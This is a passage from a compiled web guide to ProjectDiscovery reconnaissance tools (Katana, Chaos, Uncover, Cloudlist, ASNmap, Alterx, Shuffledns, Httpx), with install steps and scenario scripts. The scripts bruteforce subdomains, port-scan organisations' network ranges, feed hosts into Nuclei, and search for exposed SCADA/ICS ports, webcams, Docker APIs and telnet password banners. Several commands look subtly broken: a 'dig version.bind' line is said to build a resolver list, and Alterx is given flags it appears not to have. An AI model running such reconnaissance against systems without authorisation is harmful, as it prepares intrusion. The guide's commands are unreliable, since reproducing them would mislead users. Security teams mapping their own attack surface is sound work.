"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Form Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Extract all forms with their methods and actions\nkatana -u https://target.com -form-extraction -json | jq '.forms[]'\n\n# Identify file upload endpoints\nkatana -u https://target.com -form-extraction | grep -i \"file\\|upload\"\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration Workflows"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Katana \u2192 FFUF for directory bruteforcing\nkatana -u https://target.com | cut -d'/' -f1-3 | sort -u | while read url; do\n    ffuf -w wordlist.txt -u $url/FUZZ\ndone\n\n# Katana \u2192 Nuclei for vulnerability scanning\nkatana -u https://target.com | nuclei -t exposures/ -t vulnerabilities/\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"4-chaos---internet-wide-asset-discovery",children:"4. Chaos - Internet-Wide Asset Discovery"}),"\n",(0,i.jsx)(n.h4,{id:"overview-3",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Chaos provides access to internet-wide asset data, offering insights into global infrastructure and enabling comprehensive asset discovery."}),"\n",(0,i.jsx)(n.h4,{id:"installation-3",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-3",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Get subdomains for a domain\nchaos -d example.com\n\n# Output to file\nchaos -d example.com -o chaos_results.txt\n\n# Silent mode\nchaos -d example.com -silent\n\n# Count results\nchaos -d example.com -count\n"})}),"\n",(0,i.jsx)(n.h4,{id:"configuration",children:"Configuration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Configure API key\nchaos -update\n\n# Set API key as environment variable\nexport CHAOS_API_KEY="your_api_key_here"\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-3",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Threat Intelligence Gathering"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Fortune 500 company\n# Objective: Map global infrastructure\n\n# Get all known subdomains\nchaos -d megacorp.com -o megacorp_chaos.txt\n\n# Cross-reference with current DNS\ndig +short $(cat megacorp_chaos.txt) | sort -u > megacorp_ips.txt\n\n# Identify cloud providers\ncat megacorp_ips.txt | while read ip; do\n    whois $ip | grep -E "(AWS|Amazon|Microsoft|Google|Azure)"\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Acquisition Intelligence"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Recently acquired company\n# Objective: Identify legacy infrastructure\n\n# Compare pre/post acquisition assets\nchaos -d oldcompany.com -o pre_acquisition.txt\nchaos -d newparent.com -o post_acquisition.txt\n\n# Find potential overlooked assets\ncomm -23 pre_acquisition.txt post_acquisition.txt > orphaned_assets.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Supply Chain Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Software vendor\n# Objective: Map vendor relationships\n\n# Get vendor's infrastructure\nchaos -d vendor.com -o vendor_assets.txt\n\n# Look for customer-specific subdomains\ngrep -E \"(client|customer|[0-9]{4,})\" vendor_assets.txt\n\n# Identify hosting patterns\ncat vendor_assets.txt | cut -d'.' -f2- | sort | uniq -c | sort -nr\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-integration",children:"Advanced Integration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Chaos + Historical Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Track infrastructure changes over time\nDOMAIN=$1\nDATE=$(date +%Y%m%d)\n\nchaos -d $DOMAIN -o "chaos_${DOMAIN}_${DATE}.txt"\n\n# Compare with previous month\nif [ -f "chaos_${DOMAIN}_previous.txt" ]; then\n    echo "New assets discovered:"\n    comm -13 "chaos_${DOMAIN}_previous.txt" "chaos_${DOMAIN}_${DATE}.txt"\n    \n    echo "Assets removed:"\n    comm -23 "chaos_${DOMAIN}_previous.txt" "chaos_${DOMAIN}_${DATE}.txt"\nfi\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"5-uncover---search-engine-for-exposed-assets",children:"5. Uncover - Search Engine for Exposed Assets"}),"\n",(0,i.jsx)(n.h4,{id:"overview-4",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Uncover searches multiple search engines (Shodan, Censys, Fofa, etc.) to find exposed hosts and services."}),"\n",(0,i.jsx)(n.h4,{id:"installation-4",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-4",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Search across all engines\nuncover -q "apache"\n\n# Search specific engine\nuncover -q "nginx" -e shodan\n\n# Search by IP range\nuncover -q "ip:192.168.1.0/24"\n\n# Limit results\nuncover -q "port:443" -limit 100\n'})}),"\n",(0,i.jsx)(n.h4,{id:"configuration-1",children:"Configuration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:'# ~/.config/uncover/provider-config.yaml\nshodan: ["api_key_here"]\ncensys: ["api_id:api_secret"]\nfofa: ["email:api_key"]\nhunter: ["api_key_here"]\nzoomeye: ["username:password"]\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-4",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: IoT Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Organization\'s IoT devices\n# Objective: Identify exposed industrial control systems\n\n# Search for common IoT protocols\nuncover -q "port:502,503,102" -e shodan,censys | grep organization.com\n\n# Look for webcams and IP cameras\nuncover -q "webcam" -q "organization.com" -limit 50\n\n# Industrial systems\nuncover -q "scada OR ics OR plc" -q "organization.com"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Cloud Misconfigurations"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Company\'s cloud infrastructure\n# Objective: Find exposed cloud services\n\n# Exposed databases\nuncover -q "mongodb" -q "company.com" -e shodan\nuncover -q "elasticsearch" -q "company.com" -e censys\n\n# Open S3 buckets\nuncover -q "http.title:Index of /" -q "company.com"\n\n# Exposed Docker APIs\nuncover -q "port:2375,2376" -q "company.com"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Attack Surface Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Critical infrastructure\n# Objective: Continuous monitoring for new exposures\n\n#!/bin/bash\n# Script: monitor_exposure.sh\nCOMPANY=$1\n\n# Monitor critical services\nfor service in "rdp" "vnc" "ssh" "ftp" "telnet"; do\n    uncover -q "$service" -q "$COMPANY" -json > "${service}_exposure_$(date +%Y%m%d).json"\ndone\n\n# Check for new exposures\nuncover -q "$COMPANY" -limit 1000 | comm -13 previous_exposure.txt - > new_exposures.txt\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-queries",children:"Advanced Queries"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Complex Search Patterns"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Multiple conditions\nuncover -q "port:80,443 AND title:login AND org:target"\n\n# Technology stack identification\nuncover -q "http.server:nginx AND http.title:admin AND target.com"\n\n# Vulnerability-specific searches\nuncover -q "http.title:phpMyAdmin AND target.com"\nuncover -q "port:23 AND banner:password AND target.com"\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"6-cloudlist---multi-cloud-asset-enumeration",children:"6. Cloudlist - Multi-Cloud Asset Enumeration"}),"\n",(0,i.jsx)(n.h4,{id:"overview-5",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Cloudlist enumerates assets across multiple cloud providers (AWS, GCP, Azure, DigitalOcean) to provide comprehensive cloud visibility."}),"\n",(0,i.jsx)(n.h4,{id:"installation-5",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/cloudlist/cmd/cloudlist@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"configuration-2",children:"Configuration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yaml",children:"# ~/.config/cloudlist/config.yaml\naws:\n  - id: AKIA...\n    secret: xxxx\n    region: us-east-1\ngcp:\n  - service_account_path: /path/to/service-account.json\nazure:\n  - tenant_id: xxx\n    client_id: xxx\n    client_secret: xxx\n    subscription_id: xxx\ndigitalocean:\n  - token: xxx\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-5",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# List all instances across providers\ncloudlist\n\n# Specific provider\ncloudlist -provider aws\n\n# Specific resource type\ncloudlist -provider aws -resource ec2\n\n# Output formats\ncloudlist -json\ncloudlist -csv\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-5",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Multi-Cloud Security Assessment"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Enterprise with multi-cloud setup\n# Objective: Comprehensive cloud asset inventory\n\n# Generate complete inventory\ncloudlist -json > cloud_inventory.json\n\n# Extract public IPs\njq -r '.[] | select(.public_ipv4 != null) | .public_ipv4' cloud_inventory.json > public_ips.txt\n\n# Identify high-risk instances\njq -r '.[] | select(.public_ipv4 != null and .private_ipv4 != null) | [.provider, .resource, .public_ipv4, .tags] | @csv' cloud_inventory.json\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Shadow IT Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Large organization\n# Objective: Find unauthorized cloud resources\n\n# Get all AWS resources across regions\nfor region in us-east-1 us-west-2 eu-west-1; do\n    cloudlist -provider aws -region $region -json > aws_${region}.json\ndone\n\n# Identify resources without proper tags\njq -r '.[] | select(.tags.Department == null or .tags.Owner == null)' aws_*.json\n\n# Find old/abandoned resources\njq -r '.[] | select(.created_time < \"2023-01-01\")' aws_*.json\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Compliance Monitoring"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Regulated industry\n# Objective: Ensure compliance with data residency requirements\n\n# Check for resources in non-compliant regions\ncloudlist -provider aws -json | jq -r '.[] | select(.region | test(\"ap-|sa-\")) | [.resource, .region, .public_ipv4] | @csv'\n\n# Identify unencrypted storage\ncloudlist -provider aws -resource s3 -json | jq -r '.[] | select(.encryption == false)'\n"})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-integration-1",children:"Advanced Integration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Automated Security Scanning"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"#!/bin/bash\n# Script: cloud_security_scan.sh\n\n# Get all public IPs\ncloudlist -json | jq -r '.[] | select(.public_ipv4 != null) | .public_ipv4' > cloud_ips.txt\n\n# Port scan cloud assets\nnaabu -list cloud_ips.txt -top-ports 1000 -o cloud_ports.txt\n\n# Web service enumeration\ncat cloud_ips.txt | httpx -silent | nuclei -t exposures/\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"7-asnmap---autonomous-system-mapping",children:"7. ASNmap - Autonomous System Mapping"}),"\n",(0,i.jsx)(n.h4,{id:"overview-6",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"ASNmap maps organization network ranges using ASN information, providing comprehensive network infrastructure visibility."}),"\n",(0,i.jsx)(n.h4,{id:"installation-6",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/asnmap/cmd/asnmap@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-6",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Get ASN info for domain\nasnmap -d example.com\n\n# Get ASN info for IP\nasnmap -ip 8.8.8.8\n\n# Get all IPs for ASN\nasnmap -asn AS15169\n\n# Output CIDR ranges\nasnmap -org "Google LLC" -cidr\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-6",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Corporate Network Mapping"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Large corporation\n# Objective: Map entire network infrastructure\n\n# Get organization\'s ASNs\nasnmap -org "Mega Corporation" -json > megacorp_asns.json\n\n# Extract all CIDR ranges\njq -r \'.[] | .cidr[]?\' megacorp_asns.json > megacorp_cidrs.txt\n\n# Get all individual IPs\nasnmap -org "Mega Corporation" -silent > megacorp_ips.txt\n\n# Scan the network ranges\ncat megacorp_cidrs.txt | while read cidr; do\n    naabu -cidr $cidr -top-ports 100 -o scan_${cidr//\\//_}.txt\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Supply Chain Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Software vendor and customers\n# Objective: Map vendor-customer relationships\n\n# Get vendor\'s network ranges\nasnmap -org "Software Vendor Inc" -cidr > vendor_cidrs.txt\n\n# Check for customer connections\ncat customer_list.txt | while read customer; do\n    echo "=== $customer ==="\n    asnmap -org "$customer" -cidr\ndone\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Threat Intelligence"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Suspicious infrastructure\n# Objective: Map malicious infrastructure\n\n# Get ASN info for suspicious IPs\ncat suspicious_ips.txt | while read ip; do\n    asnmap -ip $ip -json\ndone > suspicious_asns.json\n\n# Identify hosting providers\njq -r '.[] | [.ip, .org, .country] | @csv' suspicious_asns.json\n\n# Find related infrastructure\njq -r '.[] | .asn' suspicious_asns.json | sort -u | while read asn; do\n    asnmap -asn $asn -silent\ndone\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"8-alterx---subdomain-wordlist-generator",children:"8. Alterx - Subdomain Wordlist Generator"}),"\n",(0,i.jsx)(n.h4,{id:"overview-7",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Alterx generates custom subdomain wordlists using a domain-specific language (DSL) for targeted subdomain discovery."}),"\n",(0,i.jsx)(n.h4,{id:"installation-7",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/alterx/cmd/alterx@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-7",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Generate variations\necho "api" | alterx\n\n# Use patterns\necho "{{word}}-{{number}}" | alterx -p\n\n# Multiple inputs\necho -e "api\\ndev\\ntest" | alterx\n\n# Output to file\necho "admin" | alterx -o admin_variations.txt\n'})}),"\n",(0,i.jsx)(n.h4,{id:"dsl-patterns",children:"DSL Patterns"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Number patterns\necho "{{word}}{{number:1-100}}" | alterx\n\n# Date patterns\necho "{{word}}-{{year}}" | alterx\n\n# Custom patterns\necho "{{word}}.{{env}}.{{region}}" | alterx -env dev,test,prod -region us,eu\n'})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-7",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: API Endpoint Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: SaaS application\n# Objective: Discover API versions and endpoints\n\n# Generate API patterns\necho -e "api\\napi-v1\\napi-v2\\nrest\\ngraphql" | alterx -p "{{word}}.{{env}}" -env "dev,staging,prod"\n\n# Versioning patterns\necho "api" | alterx -p "{{word}}{{version}}" -version "v1,v2,v3,1,2,3"\n\n# Regional patterns\necho "api" | alterx -p "{{region}}-{{word}}" -region "us-east,us-west,eu-west,ap-south"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: Development Environment Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Development team\n# Objective: Find dev/test environments\n\n# Environment-based patterns\necho -e "app\\nportal\\ndashboard" | alterx -p "{{env}}-{{word}}" -env "dev,test,staging,qa,demo,beta"\n\n# Developer-specific patterns\necho "dev" | alterx -p "{{word}}-{{name}}" -name "john,jane,mike,sarah"\n\n# Feature branch patterns\necho "feature" | alterx -p "{{word}}-{{feature}}" -feature "auth,payment,api,ui"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Infrastructure Pattern Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Large enterprise\n# Objective: Understand naming conventions\n\n# Geographic patterns\necho -e "mail\\nvpn\\nportal" | alterx -p "{{location}}-{{word}}" -location "nyc,lon,tok,syd"\n\n# Departmental patterns\necho "intranet" | alterx -p "{{dept}}-{{word}}" -dept "hr,finance,it,legal,marketing"\n\n# Infrastructure patterns\necho "server" | alterx -p "{{word}}{{number:01-99}}" > server_patterns.txt\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-pattern-generation",children:"Advanced Pattern Generation"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Dictionary Integration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Use organization-specific terms\necho -e "internal\\nconfidential\\nrestricted" | alterx -p "{{word}}-{{classification}}" -classification "public,private,secret"\n\n# Technology stack patterns\necho "app" | alterx -p "{{word}}-{{tech}}" -tech "java,python,nodejs,php,dotnet"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration with Discovery Tools"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Generate patterns and test with subfinder\necho "api" | alterx -p "{{word}}-{{env}}" | while read pattern; do\n    subfinder -d target.com -w <(echo $pattern)\ndone\n\n# Combine with brute force tools\necho "admin" | alterx > admin_patterns.txt\ngobuster dns -d target.com -w admin_patterns.txt\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"9-shuffledns---dns-bruteforce-with-wildcard-handling",children:"9. Shuffledns - DNS Bruteforce with Wildcard Handling"}),"\n",(0,i.jsx)(n.h4,{id:"overview-8",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Shuffledns is a wrapper around massDNS for bruteforcing subdomains with advanced wildcard detection and handling."}),"\n",(0,i.jsx)(n.h4,{id:"installation-8",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"prerequisites",children:"Prerequisites"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Install massDNS\ngit clone https://github.com/blechschmidt/massdns.git\ncd massdns\nmake\nsudo cp bin/massdns /usr/local/bin/\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-8",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Basic bruteforce\nshuffledns -d example.com -w wordlist.txt\n\n# Use custom resolvers\nshuffledns -d example.com -w wordlist.txt -r resolvers.txt\n\n# Output to file\nshuffledns -d example.com -w wordlist.txt -o discovered.txt\n\n# Wildcard filtering\nshuffledns -d example.com -w wordlist.txt -wt 10\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-8",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Comprehensive Subdomain Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: E-commerce platform\n# Objective: Find all subdomains including wildcards\n\n# Create comprehensive wordlist\ncat /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \\\n    /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt > comprehensive.txt\n\n# Run with wildcard detection\nshuffledns -d ecommerce.com -w comprehensive.txt -wt 5 -t 100 -o ecommerce_subs.txt\n\n# Validate results\ncat ecommerce_subs.txt | httpx -silent -o valid_subdomains.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: CDN and Load Balancer Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Global service provider\n# Objective: Map CDN infrastructure\n\n# Geographic patterns\necho -e \"cdn\\nstatic\\nassets\\nmedia\\nimages\" > cdn_words.txt\nshuffledns -d globalservice.com -w cdn_words.txt -wt 3\n\n# Numeric patterns for load balancers\nseq 1 100 | sed 's/^/lb/' > lb_numbers.txt\nshuffledns -d globalservice.com -w lb_numbers.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Legacy System Discovery"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Acquired company\n# Objective: Find forgotten legacy systems\n\n# Old naming conventions\necho -e "old\\nlegacy\\narchive\\nbackup\\ntest\\ndev\\nstaging" > legacy_words.txt\n\n# Year-based patterns\nfor year in {2010..2020}; do echo "system$year"; done > year_patterns.txt\n\n# Technology-specific patterns\necho -e "exchange\\nsharepoint\\ncitrix\\nvmware\\njenkins" > tech_words.txt\n\n# Combine and test\ncat legacy_words.txt year_patterns.txt tech_words.txt > legacy_combined.txt\nshuffledns -d acquired-company.com -w legacy_combined.txt -wt 5\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-configuration-3",children:"Advanced Configuration"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Custom Resolver Lists"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Create high-quality resolver list\necho -e "8.8.8.8\\n8.8.4.4\\n1.1.1.1\\n1.0.0.1" > resolvers.txt\n\n# Add more resolvers for redundancy\ndig @8.8.8.8 +short txt version.bind | head -20 >> resolvers.txt\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Performance Optimization"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# High-performance configuration\nshuffledns -d target.com -w huge_wordlist.txt -t 500 -wt 10 -retries 2 -timeout 3\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Integration Workflows"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Shuffledns \u2192 Httpx \u2192 Nuclei pipeline\nshuffledns -d target.com -w wordlist.txt -silent | \\\nhttpx -silent -follow-redirects | \\\nnuclei -t technologies/ -silent\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"enrichment-tools",children:"Enrichment Tools"}),"\n",(0,i.jsx)(n.h3,{id:"10-httpx---http-toolkit-for-reconnaissance",children:"10. Httpx - HTTP Toolkit for Reconnaissance"}),"\n",(0,i.jsx)(n.h4,{id:"overview-9",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Httpx is a fast HTTP toolkit for probing services, identifying web servers, and gathering HTTP metadata."}),"\n",(0,i.jsx)(n.h4,{id:"installation-9",children:"Installation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest\n"})}),"\n",(0,i.jsx)(n.h4,{id:"basic-usage-9",children:"Basic Usage"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Probe URLs\necho "https://example.com" | httpx\n\n# Probe from file\nhttpx -list urls.txt\n\n# Show response status\nhttpx -list urls.txt -status-code\n\n# Extract titles\nhttpx -list urls.txt -title\n'})}),"\n",(0,i.jsx)(n.h4,{id:"advanced-features",children:"Advanced Features"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Technology Detection"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Detect web technologies\nhttpx -list urls.txt -tech-detect\n\n# Server headers\nhttpx -list urls.txt -server\n\n# Response headers\nhttpx -list urls.txt -response-headers\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Content Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Extract page titles and content length\nhttpx -list urls.txt -title -content-length\n\n# Response time analysis\nhttpx -list urls.txt -response-time\n\n# Status code filtering\nhttpx -list urls.txt -mc 200,301,302\n"})}),"\n",(0,i.jsx)(n.h4,{id:"real-world-scenarios-9",children:"Real-World Scenarios"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 1: Large-Scale Web Asset Enumeration"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Target: Fortune 500 company\n# Objective: Map all web services and technologies\n\n# Step 1: Get all subdomains\nsubfinder -d megacorp.com -silent > megacorp_subs.txt\n\n# Step 2: Probe all HTTP services\ncat megacorp_subs.txt | httpx -silent -threads 50 -timeout 10 > megacorp_http.txt\n\n# Step 3: Technology stack analysis\ncat megacorp_http.txt | httpx -tech-detect -json > megacorp_tech.json\n\n# Step 4: Extract critical information\njq -r '.[] | [.url, .tech, .status_code, .title] | @csv' megacorp_tech.json > technology_matrix.csv\n\n# Step 5: Identify high-value targets\ngrep -E \"(admin|login|portal|dashboard)\" megacorp_http.txt > high_value_targets.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 2: API Discovery and Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: API-heavy application\n# Objective: Discover and analyze API endpoints\n\n# Probe for API endpoints\necho -e "api\\napi-v1\\napi-v2\\nrest\\ngraphql\\nv1\\nv2\\nv3" | \\\nwhile read api; do echo "https://target.com/$api"; done | \\\nhttpx -silent -mc 200,401,403\n\n# Check for API documentation\necho -e "docs\\napi-docs\\nswagger\\nopenapi\\ngraphiql" | \\\nwhile read doc; do echo "https://target.com/$doc"; done | \\\nhttpx -title -mc 200\n\n# Analyze API responses\ncat api_endpoints.txt | httpx -json -content-type > api_analysis.json\njq -r \'.[] | select(.content_type | contains("json")) | .url\' api_analysis.json\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scenario 3: Security Header Analysis"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Target: Security-conscious organization\n# Objective: Assess security header implementation\n\n# Check security headers\ncat domains.txt | httpx -response-headers -json | \\\njq -r \'.[] | [.url, .headers["strict-transport-security"], .headers["content-security-policy"], .headers["x-frame-options"]] | @csv\'\n\n# Identify missing security headers\ncat domains.txt | httpx -json | \\\njq -r \'.[] | select(.headers["strict-transport-security"] == null or .headers["content-security-policy"] == null) | 